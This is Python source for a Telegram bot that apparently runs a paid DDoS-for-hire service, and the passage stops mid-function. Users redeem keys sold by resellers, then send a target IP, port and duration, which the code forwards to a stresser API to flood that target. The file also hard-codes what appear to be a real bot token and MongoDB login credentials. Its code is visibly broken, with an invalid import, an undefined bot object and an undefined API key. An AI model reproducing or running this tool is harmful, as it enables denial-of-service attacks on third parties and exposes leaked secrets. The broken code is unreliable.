# flameddos.py - Complete Working Bot with Individual Cooldown & Multiple Attacks
import asyncio
import logging
from datetime import datetime, timedelta, timezone
from typing import Dict, Optional, List
import requests
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    filters,
    ContextTypes
)
import pymongo
from pymongo import MongoClient, ASCENDING, DESCENDING
from bson import ObjectId
import re
from functools import wraps
import html
import uuid
import os
from dotenv import load_dotenv

import InlineKeyboardMarkup, InlineKeyboardButton
import threading
import random
import string
import requests
import psutil
import traceback
import time

# ============ CONFIGURATION ============
BOT_OWNER = 1165613821
BOT_START_TIME = datetime.now()
BOT_TOKEN = "8728800490:AAFxqfqcr9dIIdsXajuVBK6zmVPozHfzX6g"
MONGO_URL = os.getenv("MONGO_URL", "mongodb+srv://vikashsinghelectora_db_user:H1KNhWYgfE8fL0oc@cluster0.0rnbsp9.mongodb.net/?appName=Cluster0")
FLARESOLVERR_URL = "https://retrostress.net/panel"
# ============ API CONFIGURATION ============
DEFAULT_MAX_SLOTS = 1
MAX_SLOTS_LIMIT = 50
current_max_slots = DEFAULT_MAX_SLOTS
MIN_ATTACK_TIME = 60

# ============ RESELLER PRICING ============
RESELLER_PRICING = {
    '12h': {'price': 25, 'seconds': 12 * 3600, 'label': '12 Hours'},
    '1d': {'price': 50, 'seconds': 24 * 3600, 'label': '1 Day'},
    '3d': {'price': 130, 'seconds': 3 * 24 * 3600, 'label': '3 Days'},
    '7d': {'price': 250, 'seconds': 7 * 24 * 3600, 'label': '1 Week'},
    '30d': {'price': 750, 'seconds': 30 * 24 * 3600, 'label': '1 Month'},
    '60d': {'price': 1250, 'seconds': 60 * 24 * 3600, 'label': '1 Season (60 Days)'}
}

DEFAULT_MAX_ATTACK_TIME = 200
DEFAULT_USER_COOLDOWN = 180

# ============ MONGODB CONNECTION ============
print("Connecting to MongoDB...")
try:
    client = MongoClient(MONGO_URL, serverSelectionTimeoutMS=5000)
    client.admin.command('ping')
    db = client['telegram_bot']
    keys_collection = db['keys']
    users_collection = db['users']
    resellers_collection = db['resellers']
    attack_logs_collection = db['attack_logs']
    bot_users_collection = db['bot_users']
    bot_settings_collection = db['bot_settings']
    feedback_collection = db['feedback']
    
    keys_collection.create_index('key', unique=True)
    users_collection.create_index('user_id', unique=True)
    resellers_collection.create_index('user_id', unique=True)
    
    print("✅ MongoDB connected successfully!")
except Exception as e:
    print(f"❌ MongoDB connection error: {e}")
    exit(1)

# ============ BOT INITIALIZATION ======

# ============ GLOBAL VARIABLES ============
pending_feedback = {}
active_attacks = {}
user_cooldowns = {}  # Individual cooldown per user
api_in_use = {}
user_attack_history = {}
bot_start_time = datetime.now()
_attack_lock = threading.Lock()

# ============ DATABASE FUNCTIONS ============
def get_setting(key, default):
    try:
        setting = bot_settings_collection.find_one({'key': key})
        if setting:
            return setting['value']
        return default
    except:
        return default

def set_setting(key, value):
    bot_settings_collection.update_one(
        {'key': key},
        {'$set': {'key': key, 'value': value}},
        upsert=True
    )

def load_max_slots():
    global current_max_slots
    saved_slots = get_setting('max_concurrent_slots', DEFAULT_MAX_SLOTS)
    current_max_slots = saved_slots


def get_api_list():
    api_url = f"https://retrostress.net/api/start?key={YOUR_API_KEY}&target={{ip}}&port={{port}}&time={{time}}&method=COAP"
    return [api_url] * current_max_slots

def update_max_slots(new_slots):
    global current_max_slots
    if new_slots < 1 or new_slots > MAX_SLOTS_LIMIT:
        return False
    current_max_slots = new_slots
    set_setting('max_concurrent_slots', new_slots)
    return True

load_max_slots()
API_LIST = get_api_list()

def update_reseller_pricing():
    for dur in RESELLER_PRICING:
        saved_price = get_setting(f'price_{dur}', None)
        if saved_price is not None:
            RESELLER_PRICING[dur]['price'] = saved_price

update_reseller_pricing()

# ============ HELPER FUNCTIONS ============
def safe_send_message(chat_id, text, reply_to=None, parse_mode=None):
    try:
        if reply_to:
            try:
                return bot.reply_to(reply_to, text, parse_mode=parse_mode)
            except Exception as e:
                print(f"Reply failed: {e}")
                return bot.send_message(chat_id, text, parse_mode=None)
        else:
            return bot.send_message(chat_id, text, parse_mode=None)
    except Exception as e:
        print(f"Safe send error: {e}")
        return None

def get_slot_status():
    with _attack_lock:
        now = datetime.now()
        expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
        for k in expired:
            if k in active_attacks:
                del active_attacks[k]
            if k in api_in_use:
                del api_in_use[k]
        
        busy_slots = len(api_in_use)
        free_slots = current_max_slots - busy_slots
        return busy_slots, free_slots, current_max_slots

def get_user_cooldown(user_id):
    if user_id in user_cooldowns:
        cooldown_end = user_cooldowns[user_id]
        remaining = (cooldown_end - datetime.now()).total_seconds()
        if remaining > 0:
            return int(remaining)
        else:
            del user_cooldowns[user_id]
    return 0

def set_user_cooldown(user_id, duration):
    cooldown_time = get_user_cooldown_setting()
    user_cooldowns[user_id] = datetime.now() + timedelta(seconds=cooldown_time)

def send_attack_via_flaresolverr(target, port, duration):
    api_url = API_LIST[0].format(ip=target, port=port, time=duration)
    
    payload = {
        "cmd": "request.get",
        "url": api_url,
        "maxTimeout": 60000,
        "cookies": []
    }
    
    try:
        print(f"🎯 Sending attack to {target}:{port} for {duration}s...")
        response = requests.post(FLARESOLVERR_URL, json=payload, timeout=70)
        
        if response.status_code == 200:
            result = response.json()
            
            if result.get('status') == 'ok':
                solution = result.get('solution', {})
                response_body = solution.get('response', {})
                
                if isinstance(response_body, dict):
                    body = response_body.get('body', '')
                else:
                    body = str(response_body)
                
                if "SUCCESS!" in body:
                    print(f"✅ Attack sent successfully to {target}:{port}")
                    return True
                else:
                    print(f"❌ API error: {body[:200]}")
                    return False
            else:
                print(f"❌ FlareSolverr error: {result.get('message')}")
                return False
        else:
            print(f"❌ HTTP error: {response.status_code}")
            return False
            
    except Exception as e:
        print(f"❌ Request error: {e}")
        return False

def get_max_attack_time():
    try:
        return int(get_setting('max_attack_time', DEFAULT_MAX_ATTACK_TIME))
    except:
        return DEFAULT_MAX_ATTACK_TIME

def get_user_cooldown_setting():
    try:
        return int(get_setting('user_cooldown', DEFAULT_USER_COOLDOWN))
    except:
        return DEFAULT_USER_COOLDOWN

def get_concurrent_limit():
    try:
        return int(get_setting('_cx_th', 1))
    except:
        return 1

def is_maintenance():
    return get_setting('maintenance_mode', False)

def get_maintenance_msg():
    return get_setting('maintenance_msg', '🔧 Bot is in maintenance mode. Please try again later.')

def set_maintenance(enabled, msg=None):
    set_setting('maintenance_mode', enabled)
    if msg:
        set_setting('maintenance_msg', msg)

def get_blocked_ips():
    return get_setting('blocked_ips', [])

def add_blocked_ip(ip_prefix):
    blocked = get_blocked_ips()
    if ip_prefix not in blocked:
        blocked.append(ip_prefix)
        set_setting('blocked_ips', blocked)
        return True
    return False

def remove_blocked_ip(ip_prefix):
    blocked = get_blocked_ips()
    if ip_prefix in blocked:
        blocked.remove(ip_prefix)
        set_setting('blocked_ips', blocked)
        return True
    return False

def is_ip_blocked(ip):
    blocked = get_blocked_ips()
    for prefix in blocked:
        if ip.startswith(prefix):
            return True
    return False

def check_maintenance(message):
    if is_maintenance() and message.from_user.id != BOT_OWNER:
        safe_send_message(message.chat.id, get_maintenance_msg(), reply_to=message)
        return True
    return False

def check_banned(message):
    user_id = message.from_user.id
    if user_id == BOT_OWNER:
        return False
    
    user = users_collection.find_one({'user_id': user_id})
    if user and user.get('banned'):
        if user.get('ban_type') == 'temporary' and user.get('ban_expiry'):
            if datetime.now() > user['ban_expiry']:
                users_collection.update_one(
                    {'user_id': user_id}, 
                    {'$set': {'banned': False}, '$unset': {'ban_expiry': "", 'ban_type': ""}}
                )
                return False
            
            expiry_str = user['ban_expiry'].strftime('%d-%m-%Y %H:%M:%S')
            safe_send_message(message.chat.id, f"🚫 YOU HAVE BEEN TEMPORARILY BANNED!\n\n⏳ Expiry: {expiry_str}\n❌ You cannot do anything.\n\n📞 Contact Your Seller", reply_to=message)
            return True
        
        safe_send_message(message.chat.id, f"🚫 YOU HAVE BEEN PERMANENTLY BANNED!\n\n❌ You cannot do anything.\n\n📞 Contact Your Seller", reply_to=message)
        return True
    return False

def get_port_protection():
    settings = bot_settings_collection.find_one({})
    if settings:
        return settings.get('port_protection', True)
    return True

def maintenance_auto_extender():
    while True:
        try:
            if is_maintenance():
                now = datetime.now()
                active_users = users_collection.find({'key_expiry': {'$gt': now}})
                for user in active_users:
                    new_expiry = user['key_expiry'] + timedelta(minutes=1)
                    users_collection.update_one(
                        {'_id': user['_id']},
                        {'$set': {'key_expiry': new_expiry}}
                    )
            time.sleep(60)
        except Exception as e:
            print(f"Maintenance extender error: {e}")
            time.sleep(10)

extender_thread = threading.Thread(target=maintenance_auto_extender, daemon=True)
extender_thread.start()

def get_active_attack_count():
    with _attack_lock:
        now = datetime.now()
        expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
        for k in expired:
            if k in active_attacks:
                del active_attacks[k]
            if k in api_in_use:
                del api_in_use[k]
        return len(active_attacks)

def get_free_api_index():
    with _attack_lock:
        now = datetime.now()
        expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
        for k in expired:
            if k in active_attacks:
                del active_attacks[k]
            if k in api_in_use:
                del api_in_use[k]
        
        busy_indices = set(api_in_use.values())
        for i in range(len(API_LIST)):
            if i not in busy_indices:
                return i
        return None

def validate_target(target):
    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    if ip_pattern.match(target):
        parts = target.split('.')
        for part in parts:
            if int(part) > 255:
                return False
        return True
    return False

def user_has_active_attack(user_id):
    with _attack_lock:
        now = datetime.now()
        for attack_id, attack in list(active_attacks.items()):
            if attack['end_time'] <= now:
                continue
            if attack.get('user_id') == user_id:
                return True
        return False

def set_pending_feedback(user_id, target, port, duration):
    pending_feedback[user_id] = {
        'target': target,
        'port': port,
        'duration': duration,
        'timestamp': datetime.now()
    }

def get_pending_feedback(user_id):
    return pending_feedback.get(user_id)

def clear_pending_feedback(user_id):
    if user_id in pending_feedback:
        del pending_feedback[user_id]

def has_pending_feedback(user_id):
    return user_id in pending_feedback

def log_attack(user_id, username, target, port, duration):
    attack_logs_collection.insert_one({
        'user_id': user_id,
        'username': username,
        'target': target,
        'port': port,
        'duration': duration,
        'timestamp': datetime.now()
    })

def generate_key(length=12):
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def parse_duration(duration_str):
    match = re.match(r'^(\d+)([smhd])$', duration_str.lower())
    if not match:
        return None, None
    
    value = int(match.group(1))
    unit = match.group(2)
    
    if unit == 's':
        return timedelta(seconds=value), f"{value} seconds"
    elif unit == 'm':
        return timedelta(minutes=value), f"{value} minutes"
    elif unit == 'h':
        return timedelta(hours=value), f"{value} hours"
    elif unit == 'd':
        return timedelta(days=value), f"{value} days"
    
    return None, None

def is_owner(user_id):
    return user_id == BOT_OWNER

def is_reseller(user_id):
    reseller = resellers_collection.find_one({'user_id': user_id, 'blocked': {'$ne': True}})
    return reseller is not None

def get_reseller(user_id):
    return resellers_collection.find_one({'user_id': user_id})

def resolve_user(input_str):
    input_str = input_str.strip().lstrip('@')
    
    try:
        user_id = int(input_str)
        return user_id, None
    except ValueError:
        pass
    
    user = users_collection.find_one({'username': {'$regex': f'^{input_str}$', '$options': 'i'}})
    if user:
        return user['user_id'], user.get('username')
    
    reseller = resellers_collection.find_one({'username': {'$regex': f'^{input_str}$', '$options': 'i'}})
    if reseller:
        return reseller['user_id'], reseller.get('username')
    
    bot_user = bot_users_collection.find_one({'username': {'$regex': f'^{input_str}$', '$options': 'i'}})
    if bot_user:
        return bot_user['user_id'], bot_user.get('username')
    
    return None, None

def has_valid_key(user_id):
    user = users_collection.find_one({'user_id': user_id, 'key': {'$ne': None}})
    
    if not user or not user.get('key_expiry'):
        return False
    
    if datetime.now() > user['key_expiry']:
        users_collection.update_one({'user_id': user_id}, {'$set': {'key': None, 'key_expiry': None}})
        return False
    
    return True

def get_time_remaining(user_id):
    user = users_collection.find_one({'user_id': user_id})
    
    if not user or not user.get('key_expiry'):
        return "0d 0h 0m 0s"
    
    remaining = user['key_expiry'] - datetime.now()
    if remaining.total_seconds() <= 0:
        return "0d 0h 0m 0s"
    
    days = remaining.days
    hours, remainder = divmod(remaining.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    
    return f"{days}d {hours}h {minutes}m {seconds}s"

def format_timedelta(td):
    days = td.days
    hours, remainder = divmod(td.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours}h {minutes}m {seconds}s"

def send_long_message(message, text, parse_mode=None):
    max_length = 4000
    if len(text) <= max_length:
        try:
            safe_send_message(message.chat.id, text, reply_to=message, parse_mode=None)
        except Exception as e:
            print(f"Send long message error: {e}")
    else:
        parts = []
        current_part = ""
        lines = text.split('\n')
        for line in lines:
            if len(current_part) + len(line) + 1 > max_length:
                parts.append(current_part)
                current_part = line + '\n'
            else:
                current_part += line + '\n'
        if current_part:
            parts.append(current_part)
        for i, part in enumerate(parts):
            try:
                if i == 0:
                    safe_send_message(message.chat.id, part, reply_to=message, parse_mode=None)
                else:
                    bot.send_message(message.chat.id, part)
                time.sleep(0.3)
            except:
                pass

def track_bot_user(user_id, username=None):
    try:
        bot_users_collection.update_one(
            {'user_id': user_id},
            {'$set': {'user_id': user_id, 'username': username, 'last_seen': datetime.now()}},
            upsert=True
        )
    except:
        pass

def build_status_message(user_id):
    attack_active = user_has_active_attack(user_id)
    cooldown = get_user_cooldown(user_id)
    busy_slots, free_slots, total_slots = get_slot_status()
    
    response = "╔══════════════════════════╗\n"
    response += "║  🔥 ATTACK STATUS  🔥       ║\n"
    response += "╠══════════════════════════╣\n"
    
    if attack_active:
        for attack_id, attack in active_attacks.items():
            if attack.get('user_id') == user_id:
                remaining = int((attack['end_time'] - datetime.now()).total_seconds())
                response += f"║  ⚔️ Your attack in progress ║\n"
                response += f"║  ⏱️ Time remaining: {remaining}s   ║\n"
                break
    else:
        response += "║  💤 No active attack      ║\n"
    
    response += "╚══════════════════════════╝\n"
    response += "\n┌─────── SLOT STATUS ───────┐\n"
    response += f"│ 🟢 Free Slots: {free_slots}/{total_slots}\n"
    response += f"│ 🔴 Used Slots: {busy_slots}/{total_slots}\n"
    response += "└──────────────────────────┘\n"
    
    if cooldown > 0:
        response += f"\n⏳ Your Cooldown: {cooldown}s"
    
    response += f"\n⚙️ Max Time: {get_max_attack_time()}s"
    
    return response

def update_status_loop(chat_id, message_id, user_id):
    try:
        update_count = 0
        while update_count < 30:
            time.sleep(2)
            if not user_has_active_attack(user_id) and get_user_cooldown(user_id) == 0:
                break
                
            new_response = build_status_message(user_id)
            try:
                bot.edit_message_text(new_response, chat_id=chat_id, message_id=message_id)
                update_count += 1
            except Exception as e:
                error_str = str(e)
                if "message to edit not found" in error_str:
                    break
                elif "message is not modified" in error_str:
                    continue
                else:
                    print(f"Status update error: {error_str}")
                    break
    except Exception as e:
        print(f"Status loop error: {e}")

def start_attack(target, port, duration, message, attack_id, api_index):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or message.from_user.first_name or str(user_id)
        
        log_attack(user_id, username, target, port, duration)
        
        safe_send_message(message.chat.id, f"⚡ Attack Started!\n\n🎯 Target: {target}:{port}\n⏱️ Time: {duration}s\n\n📊 Check /status for updates", reply_to=message)
        
        concurrent_limit = get_concurrent_limit()
        for i in range(concurrent_limit):
            success = send_attack_via_flaresolverr(target, port, duration)
            if success:
                print(f"✅ Attack {i+1}/{concurrent_limit} sent")
            time.sleep(1)
        
        time.sleep(duration)
        
        with _attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
            if attack_id in api_in_use:
                del api_in_use[attack_id]
        
        # Set individual cooldown for this user
        set_user_cooldown(user_id, duration)
        
        set_pending_feedback(user_id, target, port, duration)
        
        cooldown_time = get_user_cooldown_setting()
        feedback_msg = (
            f"✅ Attack Complete!\n\n"
            f"🎯 Target: {target}:{port}\n"
            f"⏱️ Duration: {duration}s\n"
            f"⏳ Your Cooldown: {cooldown_time}s\n\n"
            f"📸 **Please send a screenshot/photo as feedback**\n"
            f"Send any photo to this chat to confirm the attack result.\n\n"
            f"⚠️ You cannot start another attack until cooldown ends and feedback is provided!"
        )
        safe_send_message(message.chat.id, feedback_msg, reply_to=message)
        
    except Exception as e:
        with _attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
            if attack_id in api_in_use:
                del api_in_use[attack_id]
        print(f"Attack error: {e}")

# ============ TELEGRAM COMMANDS ============

@bot.message_handler(commands=["id"])
def id_command(message):
    if check_banned(message): return
    user_id = message.from_user.id
    safe_send_message(message.chat.id, f"`{user_id}`", reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["ping"])
def ping_command(message):
    start_time = datetime.now()
    total_users = users_collection.count_documents({})
    maintenance_status = "✅ Disabled" if not is_maintenance() else "🔴 Enabled"
    
    uptime_seconds = (datetime.now() - bot_start_time).total_seconds()
    hours = int(uptime_seconds // 3600)
    minutes = int((uptime_seconds % 3600) // 60)
    seconds = int(uptime_seconds % 60)
    uptime_str = f"{hours}h {minutes:02d}m {seconds:02d}s"
    
    response_time = int((datetime.now() - start_time).total_seconds() * 1000)
    
    response = f"🏓 Pong!\n\n"
    response += f"• Response Time: {response_time}ms\n"
    response += f"• Bot Status: 🟢 Online\n"
    response += f"• Users: {total_users}\n"
    response += f"• Maintenance Mode: {maintenance_status}\n"
    response += f"• Uptime: {uptime_str}"
    
    safe_send_message(message.chat.id, response, reply_to=message)

@bot.message_handler(commands=["gen"])
def generate_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    reseller = get_reseller(user_id)
    
    if is_owner(user_id):
        command_parts = message.text.split()
        if len(command_parts) != 3:
            safe_send_message(message.chat.id, "⚠️ Usage: /gen <duration> <count>\n\nFormat: s/m/h/d\nExample: /gen 1d 1\nBulk: /gen 1d 5", reply_to=message)
            return
        
        duration_str = command_parts[1].lower()
        duration, duration_label = parse_duration(duration_str)
        
        if not duration:
            safe_send_message(message.chat.id, "❌ Invalid format! Use: s/m/h/d", reply_to=message)
            return
        
        try:
            count = int(command_parts[2])
            if count < 1 or count > 50:
                safe_send_message(message.chat.id, "❌ Count must be between 1-50!", reply_to=message)
                return
        except:
            safe_send_message(message.chat.id, "❌ Invalid count!", reply_to=message)
            return
        
        generated_keys = []
        for _ in range(count):
            key = f"BGMI-{generate_key(12)}"
            key_doc = {
                'key': key,
                'duration_seconds': int(duration.total_seconds()),
                'duration_label': duration_label,
                'created_at': datetime.now(),
                'created_by': user_id,
                'created_by_type': 'owner',
                'used': False,
                'used_by': None,
                'used_at': None,
                'max_users': 1
            }
            keys_collection.insert_one(key_doc)
            generated_keys.append(key)
        
        if count == 1:
            safe_send_message(message.chat.id, f"✅ Key Generated!\n\n🔑 Key: <code>{generated_keys[0]}</code>\n⏰ Duration: {duration_label}", reply_to=message, parse_mode="HTML")
        else:
            keys_text = "\n".join([f"• <code>{k}</code>" for k in generated_keys])
            safe_send_message(message.chat.id, f"✅ {count} Keys Generated!\n\n🔑 Keys:\n{keys_text}\n\n⏰ Duration: {duration_label}", reply_to=message, parse_mode="HTML")
    
    elif reseller:
        if reseller.get('blocked'):
            safe_send_message(message.chat.id, "🚫 Your panel is blocked!", reply_to=message)
            return
        
        command_parts = message.text.split()
        if len(command_parts) != 3:
            safe_send_message(message.chat.id, "⚠️ Usage: /gen <duration> <count>\n\nDurations: 12h, 1d, 3d, 7d, 30d, 60d\n\nExample: /gen 1d 1\nBulk: /gen 1d 5", reply_to=message)
            return
        
        duration_key = command_parts[1].lower()
        
        if duration_key not in RESELLER_PRICING:
            safe_send_message(message.chat.id, "❌ Invalid duration!\n\nValid: 12h, 1d, 3d, 7d, 30d, 60d", reply_to=message)
            return
        
        try:
            count = int(command_parts[2])
            if count < 1 or count > 20:
                safe_send_message(message.chat.id, "❌ Count must be between 1-20!", reply_to=message)
                return
        except:
            safe_send_message(message.chat.id, "❌ Invalid count!", reply_to=message)
            return
        
        pricing = RESELLER_PRICING[duration_key]
        price = pricing['price']
        total_price = price * count
        balance = reseller.get('balance', 0)
        
        if balance < total_price:
            safe_send_message(message.chat.id, f"❌ Insufficient balance!\n\n💵 Required: {total_price} Rs ({count} x {price})\n💰 Your Balance: {balance} Rs\n\nAdd balance from owner!", reply_to=message)
            return
        
        username = message.from_user.username or str(user_id)
        generated_keys = []
        
        for _ in range(count):
            key = f"{username}-{generate_key(10)}"
            key_doc = {
                'key': key,
                'duration_seconds': pricing['seconds'],
                'duration_label': pricing['label'],
                'created_at': datetime.now(),
                'created_by': user_id,
                'created_by_username': username,
                'created_by_type': 'reseller',
                'used': False,
                'used_by': None,
                'used_at': None,
                'max_users': 1
            }
            keys_collection.insert_one(key_doc)
            generated_keys.append(key)
        
        new_balance = balance - total_price
        resellers_collection.update_one(
            {'user_id': user_id},
            {'$set': {'balance': new_balance}, '$inc': {'total_keys_generated': count}}
        )

        try:
            keys_list_str = "\n".join([f"<code>{k}</code>" for k in generated_keys])
            owner_msg = (
                "🔔 <b>Reseller Key Notification</b>\n\n"
                f"👤 <b>Reseller:</b> {username} ({user_id})\n"
                f"🔑 <b>Keys Generated:</b> {count}\n"
                f"⏰ <b>Duration:</b> {pricing['label']}\n"
                f"💵 <b>Total Cost:</b> {total_price} Rs\n"
                f"💰 <b>Remaining Balance:</b> {new_balance} Rs\n\n"
                f"📜 <b>Keys:</b>\n{keys_list_str}"
            )
            bot.send_message(BOT_OWNER, owner_msg, parse_mode="HTML")
        except Exception as e:
            print(f"Failed to notify owner: {e}")
        
        if count == 1:
            safe_send_message(message.chat.id, f"✅ Key Generated!\n\n🔑 Key: <code>{generated_keys[0]}</code>\n⏰ Duration: {pricing['label']}\n💰 Balance: {new_balance} Rs", reply_to=message, parse_mode="HTML")
        else:
            keys_text = "\n".join([f"• <code>{k}</code>" for k in generated_keys])
            safe_send_message(message.chat.id, f"✅ {count} Keys Generated!\n\n🔑 Keys:\n{keys_text}\n\n⏰ Duration: {pricing['label']}\n💵 Cost: {total_price} Rs\n💰 Balance: {new_balance} Rs", reply_to=message, parse_mode="HTML")
    
    else:
        safe_send_message(message.chat.id, "❌ This command can only be used by owner/reseller!", reply_to=message)

@bot.message_handler(commands=["add_reseller", "addreseller"])
def add_reseller_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /add_reseller <id or @username>", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, "❌ User not found! Ask them to use /id command first.", reply_to=message)
        return
    
    existing = resellers_collection.find_one({'user_id': reseller_id})
    if existing:
        safe_send_message(message.chat.id, "❌ This user is already a reseller!", reply_to=message)
        return
    
    reseller_doc = {
        'user_id': reseller_id,
        'username': resolved_name,
        'balance': 0,
        'added_at': datetime.now(),
        'added_by': user_id,
        'blocked': False,
        'total_keys_generated': 0
    }
    
    resellers_collection.insert_one(reseller_doc)
    
    try:
        bot.send_message(reseller_id, "🎉 Congratulations! You are now a Reseller!\n\n💰 Use /mysaldo to check balance\n🔑 Use /gen to generate keys\n💵 Use /prices to see pricing")
    except:
        pass
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    safe_send_message(message.chat.id, f"✅ Reseller added!\n\n👤 User: {display}\n🆔 ID: {reseller_id}\n💰 Balance: 0 Rs", reply_to=message)

@bot.message_handler(commands=["remove_reseller", "removereseller"])
def remove_reseller_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /remove_reseller <id or @username>", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    result = resellers_collection.delete_one({'user_id': reseller_id})
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    if result.deleted_count > 0:
        safe_send_message(message.chat.id, f"✅ Reseller {display} removed!", reply_to=message)
    else:
        safe_send_message(message.chat.id, "❌ Reseller not found!", reply_to=message)

@bot.message_handler(commands=["block_reseller", "blockreseller"])
def block_reseller_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /block_reseller <id or @username>", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    result = resellers_collection.update_one({'user_id': reseller_id}, {'$set': {'blocked': True}})
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    if result.modified_count > 0:
        safe_send_message(message.chat.id, f"🚫 Reseller {display} blocked!", reply_to=message)
    else:
        safe_send_message(message.chat.id, "❌ Reseller not found or already blocked!", reply_to=message)

@bot.message_handler(commands=["unblock_reseller", "unblockreseller"])
def unblock_reseller_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /unblock_reseller <id or @username>", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    result = resellers_collection.update_one({'user_id': reseller_id}, {'$set': {'blocked': False}})
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    if result.modified_count > 0:
        safe_send_message(message.chat.id, f"✅ Reseller {display} unblocked!", reply_to=message)
    else:
        safe_send_message(message.chat.id, "❌ Reseller not found!", reply_to=message)

@bot.message_handler(commands=["all_resellers", "allresellers"])
def all_resellers_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    resellers = list(resellers_collection.find())
    
    if not resellers:
        safe_send_message(message.chat.id, "📋 No resellers found!", reply_to=message)
        return
    
    response = "═══════════════════════════\n"
    response += "👥 RESELLER LIST\n"
    response += "═══════════════════════════\n\n"
    
    active_resellers = [r for r in resellers if not r.get('blocked')]
    blocked_resellers = [r for r in resellers if r.get('blocked')]
    
    response += f"🟢 ACTIVE: {len(active_resellers)}\n"
    response += "───────────────────────────\n"
    
    for i, r in enumerate(active_resellers[:10], 1):
        response += f"{i}. 👤 `{r['user_id']}`\n"
        response += f"   💵 Balance: {r.get('balance', 0)} Rs\n"
        response += f"   🔑 Keys: {r.get('total_keys_generated', 0)}\n\n"
    
    if blocked_resellers:
        response += f"🔴 BLOCKED: {len(blocked_resellers)}\n"
        response += "───────────────────────────\n"
        for i, r in enumerate(blocked_resellers[:5], 1):
            response += f"{i}. 👤 `{r['user_id']}`\n"
    
    response += "\n═══════════════════════════"
    
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["saldo_add"])
def saldo_add_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, "⚠️ Usage: /saldo_add <id or @username> <amount>", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    try:
        amount = int(command_parts[2])
    except ValueError:
        safe_send_message(message.chat.id, "❌ Invalid amount!", reply_to=message)
        return
    
    if amount <= 0:
        safe_send_message(message.chat.id, "❌ Amount must be positive!", reply_to=message)
        return
    
    reseller = resellers_collection.find_one({'user_id': reseller_id})
    if not reseller:
        safe_send_message(message.chat.id, "❌ Reseller not found!", reply_to=message)
        return
    
    new_balance = reseller.get('balance', 0) + amount
    resellers_collection.update_one({'user_id': reseller_id}, {'$set': {'balance': new_balance}})
    
    try:
        bot.send_message(reseller_id, f"💰 Balance Added!\n\n➕ Added: {amount} Rs\n💵 New Balance: {new_balance} Rs")
    except:
        pass
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    safe_send_message(message.chat.id, f"✅ Balance Added!\n\n👤 Reseller: {display}\n🆔 ID: {reseller_id}\n➕ Added: {amount} Rs\n💵 New Balance: {new_balance} Rs", reply_to=message)

@bot.message_handler(commands=["saldo_remove"])
def saldo_remove_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, "⚠️ Usage: /saldo_remove <id or @username> <amount>", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    try:
        amount = int(command_parts[2])
    except ValueError:
        safe_send_message(message.chat.id, "❌ Invalid amount!", reply_to=message)
        return
    
    reseller = resellers_collection.find_one({'user_id': reseller_id})
    if not reseller:
        safe_send_message(message.chat.id, "❌ Reseller not found!", reply_to=message)
        return
    
    new_balance = max(0, reseller.get('balance', 0) - amount)
    resellers_collection.update_one({'user_id': reseller_id}, {'$set': {'balance': new_balance}})
    
